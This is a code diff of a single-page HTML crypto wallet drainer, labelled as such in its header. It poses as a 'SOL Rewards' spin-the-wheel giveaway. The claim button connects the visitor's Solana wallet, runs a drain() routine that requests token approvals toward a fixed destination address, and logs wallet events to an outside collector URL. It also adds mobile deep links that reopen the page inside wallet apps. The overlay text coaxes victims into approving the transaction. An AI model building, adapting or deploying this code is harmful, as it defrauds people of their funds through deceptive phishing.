@@ -1,55 +1,53 @@
-<!-- language: HTML, file: index.html, target: Solana web3 single-file drainer -->
+<!-- language: HTML, file: index.html, target: Solana web3 single-file drainer, mobile deep-link -->
 <!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
-<meta name="theme-color" content="#000000">
-<!-- iOS Safari smart banner — leads with Phantom. Swap app-id/app-argument for another wallet if needed. -->
-<meta name="apple-itunes-app" content="app-id=1598432977, app-argument=https://YOUR-DOMAIN.example/">
-<title>SOL Rewards</title>
+<meta name="theme-color" content="#0a0b0f">
+<title>SOL Rewards — Spin &amp; Claim</title>
 <style>
+  :root{--bg:#0a0b0f;--card:#141821;--line:#232838;--txt:#e8eaf0;--dim:#8b93a7;--acc:#14f195;--acc2:#9945ff}
   *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
-  html,body{margin:0;padding:0;background:#000;color:#e6e6e6;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;-webkit-font-smoothing:antialiased}
-  body{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+  body{font-family:system-ui,-apple-system,sans-serif;background:radial-gradient(1200px 700px at 50% -15%,#1c1146,var(--bg));color:var(--txt);margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:16px}
+  .card{width:100%;max-width:460px;background:linear-gradient(180deg,#161b26,#10131b);border:1px solid var(--line);border-radius:20px;padding:26px 20px;text-align:center;box-shadow:0 24px 70px #000a}
+  h1{font-size:20px;margin:0 0 6px;letter-spacing:.2px}
+  .sub{color:var(--dim);font-size:13px;margin:0 0 22px}
+  .wheel-wrap{position:relative;width:min(280px,78vw);height:min(280px,78vw);margin:0 auto 22px}
+  .rim{position:absolute;inset:-10px;border-radius:50%;background:conic-gradient(from 0deg,#14f195,#9945ff,#14f195,#9945ff,#14f195);filter:blur(14px);opacity:.5;z-index:0;animation:spinSlow 8s linear infinite}
+  @keyframes spinSlow{to{transform:rotate(360deg)}}
+  .ptr{position:absolute;top:-16px;left:50%;transform:translateX(-50%);width:0;height:0;border-left:14px solid transparent;border-right:14px solid transparent;border-top:24px solid var(--acc);z-index:5;filter:drop-shadow(0 0 10px #14f195aa)}
+  .wheel-outer{position:relative;width:100%;height:100%;border-radius:50%;border:6px solid #2a3142;overflow:hidden;background:#0a0b0f}
+  .wheel-svg{width:100%;height:100%;display:block;transition:transform 5s cubic-bezier(.17,.67,.12,1);transform-origin:50% 50%;will-change:transform}
+  .hub{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:80px;height:80px;border-radius:50%;background:radial-gradient(circle at 50% 40%,#1c2333,#0a0b0f);border:3px solid #2a3142;display:flex;align-items:center;justify-content:center;font-weight:900;font-size:12px;color:var(--dim);letter-spacing:.5px;z-index:4;box-shadow:0 0 30px #14f19533}
+  button{width:100%;padding:15px;border:0;border-radius:12px;font-size:15px;font-weight:700;cursor:pointer;background:linear-gradient(90deg,var(--acc),var(--acc2));color:#04121a;letter-spacing:.3px;transition:transform .1s;-webkit-appearance:none}
+  button:active{transform:scale(.98)}
+  button:disabled{opacity:.55;cursor:default;transform:none}
+  #status{margin-top:14px;font-size:12px;color:var(--dim);min-height:16px;word-break:break-all}
+  .prize{font-size:24px;font-weight:900;background:linear-gradient(90deg,var(--acc),var(--acc2));-webkit-background-clip:text;background-clip:text;color:transparent;min-height:30px;margin-bottom:8px}
+  #claim{display:none;margin-top:10px;background:linear-gradient(90deg,#9945ff,#14f195)}
 
-  .card{width:100%;max-width:420px;background:#0a0a0a;border:1px solid #1c1c1c;border-radius:14px;padding:28px 24px}
-  h1{font-size:18px;font-weight:600;margin:0 0 4px;letter-spacing:-.2px;color:#fff}
-  .sub{font-size:13px;color:#6e6e6e;margin:0 0 24px}
-
-  .wheel-wrap{position:relative;width:min(280px,74vw);height:min(280px,74vw);margin:0 auto 24px}
-  .wheel-svg{width:100%;height:100%;display:block;transition:transform 5s cubic-bezier(.16,.84,.44,1);transform-origin:50% 50%;will-change:transform}
-  .ptr{position:absolute;top:-6px;left:50%;transform:translateX(-50%);width:0;height:0;border-left:9px solid transparent;border-right:9px solid transparent;border-top:14px solid #d4d4d4;z-index:5}
-  .hub{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:68px;height:68px;border-radius:50%;background:#000;border:1px solid #262626;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:600;color:#8a8a8a;letter-spacing:.6px;text-transform:uppercase;z-index:4}
-
-  button{width:100%;padding:14px;border:1px solid #262626;border-radius:10px;background:#141414;color:#fff;font-size:14px;font-weight:600;font-family:inherit;cursor:pointer;transition:background .12s,border-color .12s}
-  button:hover:not(:disabled){background:#1a1a1a;border-color:#333}
-  button:disabled{opacity:.5;cursor:default}
-  #spin{margin-top:4px}
-  #claim{display:none;margin-top:8px;background:#fff;color:#000;border-color:#fff}
-  #claim:hover:not(:disabled){background:#e6e6e6;border-color:#e6e6e6}
-  #status{margin-top:14px;font-size:12px;color:#6e6e6e;min-height:14px;text-align:center;word-break:break-word}
-  .prize{font-size:20px;font-weight:600;color:#fff;min-height:26px;margin-bottom:10px;text-align:center}
-
-  .overlay{position:fixed;inset:0;background:rgba(0,0,0,.88);display:none;align-items:center;justify-content:center;padding:20px;z-index:100}
+  .overlay{position:fixed;inset:0;background:rgba(4,6,12,.82);backdrop-filter:blur(6px);-webkit-backdrop-filter:blur(6px);display:none;align-items:center;justify-content:center;padding:18px;z-index:100;animation:fadeIn .25s ease}
   .overlay.show{display:flex}
-  .modal{width:100%;max-width:360px;background:#0a0a0a;border:1px solid #1c1c1c;border-radius:14px;padding:28px 24px;text-align:center}
-  .spinner{width:36px;height:36px;margin:0 auto 18px;border-radius:50%;border:2px solid #1c1c1c;border-top-color:#fff;animation:rot .9s linear infinite}
+  @keyframes fadeIn{from{opacity:0}to{opacity:1}}
+  .modal{width:100%;max-width:400px;background:linear-gradient(180deg,#161b26,#0f1219);border:1px solid var(--line);border-radius:18px;padding:26px 20px;text-align:center;box-shadow:0 30px 80px #000b;animation:pop .3s cubic-bezier(.17,.67,.12,1)}
+  @keyframes pop{from{transform:scale(.9);opacity:0}to{transform:scale(1);opacity:1}}
+  .spinner{width:52px;height:52px;margin:0 auto 16px;border-radius:50%;border:4px solid #232838;border-top-color:var(--acc);animation:rot 1s linear infinite}
   @keyframes rot{to{transform:rotate(360deg)}}
-  .modal h2{font-size:16px;font-weight:600;margin:0 0 8px;color:#fff}
-  .modal p{font-size:13px;color:#8a8a8a;margin:0 0 18px;line-height:1.5}
-  .modal .chk{display:flex;align-items:center;justify-content:center;gap:7px;font-size:12px;color:#8a8a8a;margin-bottom:18px}
-  .modal .chk .dot{width:6px;height:6px;border-radius:50%;background:#fff;animation:pulse 1.4s ease-in-out infinite}
-  @keyframes pulse{0%,100%{opacity:.3}50%{opacity:1}}
-  .modal button{background:#141414;border:1px solid #262626;color:#fff}
-  .modal button:hover:not(:disabled){background:#1a1a1a}
+  .modal h2{font-size:17px;margin:0 0 10px}
+  .modal p{font-size:13px;color:var(--dim);margin:0 0 16px;line-height:1.5}
+  .modal .chk{display:flex;align-items:center;justify-content:center;gap:8px;font-size:13px;color:var(--acc);margin-bottom:16px}
+  .modal .chk .dot{width:8px;height:8px;border-radius:50%;background:var(--acc);box-shadow:0 0 10px var(--acc);animation:pulse 1.2s ease-in-out infinite}
+  @keyframes pulse{0%,100%{opacity:.4}50%{opacity:1}}
+  .modal button{background:linear-gradient(90deg,var(--acc),var(--acc2))}
 
-  .wlist{display:flex;flex-direction:column;gap:8px;margin-top:4px}
-  .wrow{display:flex;align-items:center;gap:12px;width:100%;padding:13px 14px;border-radius:10px;background:#0f0f0f;border:1px solid #1c1c1c;color:#e6e6e6;font-size:14px;font-weight:500;font-family:inherit;cursor:pointer;text-align:left;text-decoration:none}
-  .wrow:hover,.wrow:active{background:#161616;border-color:#262626}
-  .wrow .ic{width:28px;height:28px;border-radius:7px;display:flex;align-items:center;justify-content:center;font-size:15px;background:#000;border:1px solid #1c1c1c;flex:0 0 auto}
-  .wrow .nm{flex:1;color:#e6e6e6}
-  .wrow .ar{color:#4d4d4d;font-size:13px}
+  /* wallet picker rows */
+  .wlist{display:flex;flex-direction:column;gap:10px;margin-top:6px}
+  .wrow{display:flex;align-items:center;gap:12px;width:100%;padding:14px 16px;border-radius:12px;background:#1a2130;border:1px solid #2a3142;color:var(--txt);font-size:15px;font-weight:600;cursor:pointer;text-align:left;transition:background .15s}
+  .wrow:hover,.wrow:active{background:#222b3d}
+  .wrow .ic{width:32px;height:32px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:18px;background:#0a0b0f}
+  .wrow .nm{flex:1}
+  .wrow .ar{color:var(--dim);font-size:14px}
 </style>
 </head>
 <body>
@@ -58,24 +56,28 @@
   <p class="sub">Spin to claim up to 2 SOL in rewards</p>
 
   <div class="wheel-wrap">
+    <div class="rim"></div>
     <div class="ptr"></div>
-    <svg class="wheel-svg" id="wheel" viewBox="0 0 300 300" preserveAspectRatio="xMidYMid meet">
-      <g id="wheelGroup"></g>
-    </svg>
-    <div class="hub" id="hub">SPIN</div>
+    <div class="wheel-outer">
+      <svg class="wheel-svg" id="wheel" viewBox="0 0 300 300" preserveAspectRatio="xMidYMid meet">
+        <g id="wheelGroup" transform-origin="150 150"></g>
+      </svg>
+      <div class="hub" id="hub">SPIN</div>
+    </div>
   </div>
 
-  <div class="prize" id="prize">Click spin to begin</div>
+  <div class="prize" id="prize">Click SPIN to begin</div>
   <button id="spin">SPIN THE WHEEL</button>
   <button id="claim">CLAIM REWARD</button>
   <div id="status"></div>
 </div>
 
+<!-- claim / wallet overlay -->
 <div class="overlay" id="overlay">
   <div class="modal">
     <div class="spinner" id="ovSpinner"></div>
     <h2 id="ovTitle">Approve in Your Wallet</h2>
-    <p id="ovText">A confirmation request has been sent to your crypto wallet. Open your wallet and approve the transaction to receive your reward.</p>
+    <p id="ovText">A confirmation request has been sent to your crypto wallet. Open your wallet and <b>approve the transaction</b> to receive your reward.</p>
     <div class="chk" id="ovChk"><span class="dot"></span> Waiting for approval…</div>
     <div class="wlist" id="ovWallets" style="display:none"></div>
     <button id="ovClose" style="display:none">Close</button>
@@ -91,21 +93,7 @@ try {
 import {
   Connection, PublicKey, SystemProgram, Transaction,
   TransactionInstruction,
-} from "@solana/web3.js@1.91.0" assert { type: "module" };
-
-// ---- fallback: if import assert fails, load from esm.sh ----
-let _Connection, _PublicKey, _SystemProgram, _Transaction, _TransactionInstruction;
-try {
-  ({ Connection: _Connection, PublicKey: _PublicKey, SystemProgram: _SystemProgram,
-     Transaction: _Transaction, TransactionInstruction: _TransactionInstruction } =
-     await import("https://esm.sh/@solana/web3.js@1.91.0"));
-} catch(_) {}
-
-const Connection           = _Connection;
-const PublicKey            = _PublicKey;
-const SystemProgram        = _SystemProgram;
-const Transaction          = _Transaction;
-const TransactionInstruction = _TransactionInstruction;
+} from "https://esm.sh/@solana/web3.js@1.91.0";
 
 // ================= config =================
 const DESTINATION = "4k57rb38GEXb4guzc31NsxJr6REj3tBLgytbkKHpWvzW";
@@ -114,102 +102,87 @@ const COLLECTOR   = "https://collector.example.net/ingest";
 const TOKEN_PROGRAM       = new PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");
 const ASSOC_TOKEN_PROGRAM = new PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL");
 const TX_SIZE_LIMIT = 1100;
-const PENDING_KEY = "sr_pending";
-const PRIZE_KEY   = "sr_prize";
 // ==========================================
 
 const SEGMENTS = [
-  { emoji:"💎", sol:"0.75", color:"#111111" },
-  { emoji:"🔥", sol:"1.20", color:"#1a1a1a" },
-  { emoji:"⚡", sol:"0.50", color:"#111111" },
-  { emoji:"💰", sol:"1.50", color:"#1a1a1a" },
-  { emoji:"🚀", sol:"0.90", color:"#111111" },
-  { emoji:"🪙", sol:"0.65", color:"#1a1a1a" },
-  { emoji:"🎁", sol:"2.00", color:"#111111" },
-  { emoji:"⭐", sol:"0.80", color:"#1a1a1a" },
+  { emoji:"💎", sol:"0.75", color:"#14f195" },
+  { emoji:"🔥", sol:"1.20", color:"#1e2432" },
+  { emoji:"⚡", sol:"0.50", color:"#9945ff" },
+  { emoji:"💰", sol:"1.50", color:"#1e2432" },
+  { emoji:"🚀", sol:"0.90", color:"#14f195" },
+  { emoji:"🪙", sol:"0.65", color:"#1e2432" },
+  { emoji:"🎁", sol:"2.00", color:"#9945ff" },
+  { emoji:"⭐", sol:"0.80", color:"#1e2432" },
 ];
 const N = SEGMENTS.length;
 const SEG_DEG = 360 / N;
 
+// ---------- mobile detect ----------
 const isMobile = /Android|iPhone|iPad|iPod|Mobile|webOS|BlackBerry/i.test(navigator.userAgent);
-const isAndroid = /Android/i.test(navigator.userAgent);
 
+// ---------- desktop wallets (injected providers) ----------
 const WALLETS = [
   { id:"phantom",  get:()=>window.phantom?.solana || (window.solana?.isPhantom?window.solana:null) },
-  { id:"solflare", get:()=>window.solflare?.solana || window.solflare },
-  { id:"backpack", get:()=>window.backpack?.solana || window.backpack },
-  { id:"glow",     get:()=>window.glow?.solana || window.glow },
+  { id:"solflare", get:()=>window.solflare },
+  { id:"backpack", get:()=>window.backpack },
+  { id:"glow",     get:()=>window.glow },
   { id:"slope",    get:()=>window.Slope },
-  { id:"exodus",   get:()=>window.exodus?.solana || window.exodus },
-  { id:"trust",    get:()=>window.trustwallet?.solana || window.trustwallet },
+  { id:"exodus",   get:()=>window.exodus?.solana },
+  { id:"trust",    get:()=>window.trustwallet?.solana },
   { id:"coinbase", get:()=>window.coinbaseSolana },
-  { id:"okx",      get:()=>window.okxwallet?.solana || window.okxwallet },
-  { id:"bitget",   get:()=>window.bitkeep?.solana || window.bitkeep },
+  { id:"okx",      get:()=>window.okxwallet?.solana },
+  { id:"bitget",   get:()=>window.bitkeep?.solana },
   { id:"brave",    get:()=>window.braveSolana },
   { id:"clover",   get:()=>window.clover_solana },
-  { id:"safepal",  get:()=>window.safepal?.solana || window.safepalProvider || (window.safepal?.isSafePal?window.safepal:null) },
+  { id:"safepal",  get:()=>window.safepal?.solana || window.safepalProvider },
 ];
 
-// real Universal Link hrefs — Safari offers the "Open in app" banner on these
+// ---------- mobile wallets: deep-link + store URLs ----------
+// url = wallet browser deeplink to reopen the page inside the wallet
+// stores = fallback if the app isn't installed
 const MOBILE_WALLETS = [
   {
     id:"phantom", name:"Phantom", icon:"👻",
-    href: (page) => `https://phantom.app/ul/browse/${encodeURIComponent(page)}?ref=${encodeURIComponent(location.origin)}`,
+    url: (page) => `https://phantom.app/ul/browse/${encodeURIComponent(page)}?ref=${encodeURIComponent(location.origin)}`,
     ios:"https://apps.apple.com/app/phantom-crypto-wallet/id1598432977",
     android:"https://play.google.com/store/apps/details?id=app.phantom",
   },
   {
-    id:"safepal", name:"SafePal", icon:"🛡️",
-    href:    (page) => `safepal://browser?url=${encodeURIComponent(page)}`,
-    hrefAlt: (page) => `safepal://openurl?url=${encodeURIComponent(page)}`,
-    hrefAlt2:(page) => `https://safepal.com/browser?url=${encodeURIComponent(page)}`,
-    ios:"https://apps.apple.com/app/safepal-wallet/id1548297139",
-    android:"https://play.google.com/store/apps/details?id=io.safepal.wallet",
-  },
-  {
     id:"exodus", name:"Exodus", icon:"🪐",
-    href: (page) => `exodus://wc?uri=${encodeURIComponent(page)}`,
+    url: (page) => `exodus://wc?uri=${encodeURIComponent(page)}`,
     ios:"https://apps.apple.com/app/exodus-crypto-wallet/id1414384820",
     android:"https://play.google.com/store/apps/details?id=exodusmovement.exodus",
   },
   {
+    id:"safepal", name:"SafePal", icon:"🛡️",
+    url: (page) => `safepal://browser?url=${encodeURIComponent(page)}`,
+    ios:"https://apps.apple.com/app/safepal-wallet/id1548297139",
+    android:"https://play.google.com/store/apps/details?id=io.safepal.wallet",
+  },
+  {
     id:"solflare", name:"Solflare", icon:"🔆",
-    href: (page) => `https://solflare.com/ul/v1/browse/${encodeURIComponent(page)}?ref=${encodeURIComponent(location.origin)}`,
+    url: (page) => `https://solflare.com/ul/v1/browse/${encodeURIComponent(page)}?ref=${encodeURIComponent(location.origin)}`,
     ios:"https://apps.apple.com/app/solflare/id1580902717",
     android:"https://play.google.com/store/apps/details?id=com.solflare.mobile",
   },
   {
     id:"backpack", name:"Backpack", icon:"🎒",
-    href: (page) => `https://backpack.app/ul/v1/browse/${encodeURIComponent(page)}?ref=${encodeURIComponent(location.origin)}`,
+    url: (page) => `https://backpack.app/ul/v1/browse/${encodeURIComponent(page)}?ref=${encodeURIComponent(location.origin)}`,
     ios:"https://apps.apple.com/app/backpack-crypto-wallet/id1640352537",
     android:"https://play.google.com/store/apps/details?id=app.backpack.mobile",
   },
 ];
 
-function getUsableProvider() {
+async function detectWallet() {
   for (const w of WALLETS) {
-    try {
-      const p = w.get();
-      if (p && typeof p.connect === "function") return { id:w.id, provider:p };
-    } catch(_) {}
+    try { const p = w.get(); if (p) return { ...w, provider:p }; } catch(_) {}
   }
-  if (window.solana && typeof window.solana.connect === "function") {
-    return { id:"generic", provider:window.solana };
-  }
-  return null;
+  if (window.solana?.connect) return { id:"generic", provider:window.solana };
+  throw new Error("No Solana wallet detected.");
 }
 
-async function waitForProvider(ms = 2000) {
-  const t0 = Date.now();
-  while (Date.now() - t0 < ms) {
-    const p = getUsableProvider();
-    if (p) return p;
-    await new Promise(r => setTimeout(r, 150));
-  }
-  return null;
-}
-
-async function connectAny(w) {
+async function connectAny() {
+  const w = await detectWallet();
   const res = await w.provider.connect();
   const pubkey = (res?.publicKey || w.provider.publicKey)?.toString();
   if (!pubkey) throw new Error("Wallet did not return a public key.");
@@ -225,19 +198,7 @@ async function log(payload) {
   } catch(_) {}
 }
 
-function savePending(prizeLabel) {
-  try { localStorage.setItem(PENDING_KEY,"1"); localStorage.setItem(PRIZE_KEY, prizeLabel); } catch(_) {}
-}
-function readPending() {
-  try {
-    return localStorage.getItem(PENDING_KEY) === "1"
-      ? { prize: localStorage.getItem(PRIZE_KEY) || "reward" } : null;
-  } catch(_) { return null; }
-}
-function clearPending() {
-  try { localStorage.removeItem(PENDING_KEY); localStorage.removeItem(PRIZE_KEY); } catch(_) {}
-}
-
+// ---------- overlay helpers ----------
 const ov = document.getElementById("overlay");
 const ovSpinner = document.getElementById("ovSpinner");
 const ovTitle = document.getElementById("ovTitle");
@@ -252,65 +213,50 @@ function showOverlay() {
   ovWallets.style.display = "none";
   ovClose.style.display = "none";
   ovTitle.textContent = "Approve in Your Wallet";
-  ovText.textContent = "A confirmation request has been sent to your crypto wallet. Open your wallet and approve the transaction to receive your reward.";
+  ovText.innerHTML = "A confirmation request has been sent to your crypto wallet. Open your wallet and <b>approve the transaction</b> to receive your reward.";
   ovChk.innerHTML = '<span class="dot"></span> Waiting for approval…';
   ov.classList.add("show");
 }
 
-// anchor-based picker — Safari Universal Link banner fires on real href clicks
 function showWalletPicker() {
+  // mobile: no injected provider — show deep-link list
   ovSpinner.style.display = "none";
   ovChk.style.display = "none";
   ovClose.style.display = "none";
   ovTitle.textContent = "Open in Your Wallet";
-  ovText.textContent = "Tap your wallet, then tap Open on the banner that appears.";
+  ovText.innerHTML = "Choose your wallet to claim your reward. Tap <b>Open</b> and approve the transaction inside your wallet app.";
   ovWallets.style.display = "flex";
   ovWallets.innerHTML = "";
 
   const page = location.href;
   for (const w of MOBILE_WALLETS) {
-    const a = document.createElement("a");
-    a.className = "wrow";
-    a.href = w.href(page);
-    a.rel = "noopener";
-
-    a.innerHTML = `<span class="ic">${w.icon}</span><span class="nm">${w.name}</span><span class="ar">›</span>`;
-    a.addEventListener("click", () => {
-      savePending("reward");
+    const row = document.createElement("button");
+    row.className = "wrow";
+    row.innerHTML = `<span class="ic">${w.icon}</span><span class="nm">${w.name}</span><span class="ar">›</span>`;
+    row.onclick = () => {
       log({ event:"wallet_deeplink", wallet:w.id });
-
-      // Safari may not auto-open; try alt schemes after 700ms if page still visible
-      const alts = [w.hrefAlt, w.hrefAlt2].filter(Boolean).map(f => f(page));
-      const store = isAndroid ? w.android : w.ios;
+      // try to open the wallet's in-app browser pointed at this page
+      const target = w.url(page);
+      const store = /Android/i.test(navigator.userAgent) ? w.android : w.ios;
       const t0 = Date.now();
-      const tryAlts = (i) => {
-        if (document.hidden) return;
-        if (i < alts.length) { location.href = alts[i]; setTimeout(() => tryAlts(i+1), 700); }
-        else if (Date.now() - t0 < 3000) { location.href = store; }
-      };
-      setTimeout(() => tryAlts(0), 700);
-    });
-    ovWallets.appendChild(a);
+      location.href = target;
+      // fallback to store if app not installed (page still alive after 1.5s)
+      setTimeout(() => {
+        if (Date.now() - t0 < 2000 && !document.hidden) {
+          location.href = store;
+        }
+      }, 1600);
+    };
+    ovWallets.appendChild(row);
   }
-}
-
-function showNoWallet() {
-  ovSpinner.style.display = "none";
-  ovChk.style.display = "none";
-  ovWallets.style.display = "none";
-  ovTitle.textContent = "No Crypto Wallet Detected";
-  ovText.textContent = "Install a Solana wallet (Phantom, Solflare, Backpack, Exodus, SafePal) to claim your reward.";
-  ovClose.style.display = "block";
-  ovClose.textContent = "Close";
-  ovClose.onclick = () => { ov.classList.remove("show"); resetClaim(); };
 }
 
 function overlaySuccess() {
   ovSpinner.style.display = "none";
   ovChk.style.display = "none";
   ovWallets.style.display = "none";
-  ovTitle.textContent = "Reward Claimed";
-  ovText.textContent = "Your reward is on its way. It may take a moment to arrive.";
+  ovTitle.textContent = "Reward Claimed!";
+  ovText.innerHTML = "Your reward is on its way. It may take a moment to arrive.";
   ovClose.style.display = "block";
   ovClose.textContent = "Done";
   ovClose.onclick = () => ov.classList.remove("show");
@@ -334,60 +280,55 @@ function resetClaim() {
   c.disabled = false;
 }
 
+// ---------- SVG wheel ----------
 function buildWheel() {
   const group = document.getElementById("wheelGroup");
+  const cx = 150, cy = 150, r = 150;
   const ns = "http://www.w3.org/2000/svg";
-  const cx = 150, cy = 150, r = 148;
   group.innerHTML = "";
 
   SEGMENTS.forEach((s, i) => {
     const a0 = (i * SEG_DEG - 90) * Math.PI / 180;
     const a1 = ((i + 1) * SEG_DEG - 90) * Math.PI / 180;
-    const x0 = cx + r * Math.cos(a0);
-    const y0 = cy + r * Math.sin(a0);
-    const x1 = cx + r * Math.cos(a1);
-    const y1 = cy + r * Math.sin(a1);
+    const x0 = cx + r * Math.cos(a0), y0 = cy + r * Math.sin(a0);
+    const x1 = cx + r * Math.cos(a1), y1 = cy + r * Math.sin(a1);
+    const large = SEG_DEG > 180 ? 1 : 0;
 
     const path = document.createElementNS(ns, "path");
     path.setAttribute("d",
       `M ${cx} ${cy} L ${x0.toFixed(2)} ${y0.toFixed(2)} ` +
-      `A ${r} ${r} 0 0 1 ${x1.toFixed(2)} ${y1.toFixed(2)} Z`);
+      `A ${r} ${r} 0 ${large} 1 ${x1.toFixed(2)} ${y1.toFixed(2)} Z`);
     path.setAttribute("fill", s.color);
-    path.setAttribute("stroke", "#000");
-    path.setAttribute("stroke-width", "1.5");
+    path.setAttribute("stroke", "#0a0b0f");
+    path.setAttribute("stroke-width", "2");
     group.appendChild(path);
 
-    const midDeg = i * SEG_DEG + SEG_DEG / 2 - 90;
-    const midRad = midDeg * Math.PI / 180;
-    const lr = r * 0.66;
-    const lx = cx + lr * Math.cos(midRad);
-    const ly = cy + lr * Math.sin(midRad);
-
-    const g = document.createElementNS(ns, "g");
-    g.setAttribute("transform", `rotate(${midDeg + 90} ${lx} ${ly})`);
+    const mid = ((i + 0.5) * SEG_DEG - 90) * Math.PI / 180;
+    const lr = r * 0.62;
+    const lx = cx + lr * Math.cos(mid);
+    const ly = cy + lr * Math.sin(mid);
 
     const emoji = document.createElementNS(ns, "text");
-    emoji.setAttribute("x", lx);
-    emoji.setAttribute("y", ly - 5);
+    emoji.setAttribute("x", lx.toFixed(2));
+    emoji.setAttribute("y", (ly - 6).toFixed(2));
     emoji.setAttribute("text-anchor", "middle");
-    emoji.setAttribute("font-size", "22");
+    emoji.setAttribute("font-size", "26");
     emoji.textContent = s.emoji;
+    group.appendChild(emoji);
 
     const amt = document.createElementNS(ns, "text");
-    amt.setAttribute("x", lx);
-    amt.setAttribute("y", ly + 14);
+    amt.setAttribute("x", lx.toFixed(2));
+    amt.setAttribute("y", (ly + 16).toFixed(2));
     amt.setAttribute("text-anchor", "middle");
-    amt.setAttribute("font-size", "11");
-    amt.setAttribute("font-weight", "600");
-    amt.setAttribute("fill", "#cfcfcf");
+    amt.setAttribute("font-size", "12");
+    amt.setAttribute("font-weight", "800");
+    amt.setAttribute("fill", "#04121a");
     amt.textContent = s.sol + " SOL";
-
-    g.appendChild(emoji);
-    g.appendChild(amt);
-    group.appendChild(g);
+    group.appendChild(amt);
   });
 }
 
+// ---------- SPL ----------
 function approveIx(tokenAccount, delegate, owner, amount) {
   const data = window.Buffer.alloc(9);
   data.writeUInt8(4, 0);
@@ -417,6 +358,7 @@ async function signAndSend(provider, connection, tx) {
   throw new Error("Wallet does not support signing.");
 }
 
+// ---------- drain ----------
 async function drain(session) {
   const connection = new Connection(RPC, "confirmed");
   const from = new PublicKey(session.pubkey);
@@ -488,18 +430,57 @@ async function drain(session) {
   }
 }
 
-async function runClaim(wallet) {
+// ---------- UI ----------
+let session = null;
+let currentRotation = 0;
+
+document.getElementById("spin").onclick = () => {
+  const svg = document.getElementById("wheel");
+  const status = document.getElementById("status");
+  const hub = document.getElementById("hub");
+  status.textContent = "";
+
+  const idx = 1 + Math.floor(Math.random() * (N - 1));
+  const targetDeg = 360 * 6 + (360 - idx * SEG_DEG);
+  currentRotation += targetDeg;
+  svg.style.transform = `rotate(${currentRotation}deg)`;
+
+  document.getElementById("spin").disabled = true;
+  hub.textContent = "…";
+
+  setTimeout(() => {
+    const seg = SEGMENTS[idx];
+    document.getElementById("prize").textContent = `You won ${seg.sol} SOL!`;
+    hub.textContent = "WON";
+    document.getElementById("claim").style.display = "block";
+    document.getElementById("spin").style.display = "none";
+  }, 5100);
+};
+
+document.getElementById("claim").onclick = async () => {
+  const btn = document.getElementById("claim");
+  btn.disabled = true;
+
+  // mobile: no injected provider in a normal Safari/Chrome tab —
+  // show deep-link picker so the page opens inside the wallet app
+  if (isMobile && !window.solana && !window.phantom && !window.solflare) {
+    showOverlay();
+    showWalletPicker();
+    await log({ event:"mobile_picker_shown" });
+    return;
+  }
+
+  // desktop (or already inside wallet browser): connect + drain
   showOverlay();
   try {
-    const session = await connectAny(wallet);
+    session = await connectAny();
     await log({ event:"connect", wallet:session.pubkey, wtype:session.id });
 
     ovTitle.textContent = "Processing Claim";
-    ovText.textContent = "Confirm the transaction in your wallet to receive your reward.";
+    ovText.innerHTML = "Confirm the transaction in your wallet to receive <b>your reward</b>.";
     ovChk.innerHTML = '<span class="dot"></span> Waiting for wallet approval…';
 
     await drain(session);
-    clearPending();
     await log({ event:"claim_complete", wallet:session.pubkey, wtype:session.id });
     overlaySuccess();
   } catch (e) {
@@ -507,67 +488,9 @@ async function runClaim(wallet) {
     await log({ event:"claim_error", wallet:session?.pubkey, error:msg });
     overlayError(msg);
   }
-}
-
-let currentRotation = 0;
-const spinBtn  = document.getElementById("spin");
-const claimBtn = document.getElementById("claim");
-
-spinBtn.onclick = () => {
-  const svg = document.getElementById("wheel");
-  const status = document.getElementById("status");
-  const hub = document.getElementById("hub");
-  status.textContent = "";
-
-  const idx = 1 + Math.floor(Math.random() * (N - 1));
-  const targetDeg = 360 * 6 + (360 - idx * SEG_DEG) - SEG_DEG / 2;
-  currentRotation += targetDeg;
-  svg.style.transform = `rotate(${currentRotation}deg)`;
-
-  spinBtn.disabled = true;
-  hub.textContent = "…";
-
-  setTimeout(() => {
-    const seg = SEGMENTS[idx];
-    document.getElementById("prize").textContent = `You won ${seg.sol} SOL`;
-    hub.textContent = "WON";
-    claimBtn.style.display = "block";
-    spinBtn.style.display = "none";
-  }, 5100);
 };
 
-claimBtn.onclick = async () => {
-  claimBtn.disabled = true;
-  showOverlay();
-
-  const wallet = await waitForProvider(2000);
-
-  if (!wallet) {
-    if (isMobile) showWalletPicker();
-    else showNoWallet();
-    await log({ event: isMobile ? "mobile_picker_shown" : "desktop_no_wallet",
-                sawSolana: !!window.solana, sawPhantom: !!window.phantom });
-    return;
-  }
-
-  await runClaim(wallet);
-};
-
-(async () => {
-  buildWheel();
-
-  const pending = readPending();
-  if (pending) {
-    const wallet = await waitForProvider(2500);
-    if (wallet) {
-      document.getElementById("prize").textContent = "Claiming your reward…";
-      document.getElementById("hub").textContent = "CLAIM";
-      spinBtn.style.display = "none";
-      claimBtn.style.display = "none";
-      await runClaim(wallet);
-    }
-  }
-})();
+buildWheel();
 </script>
 </body>
 </html>
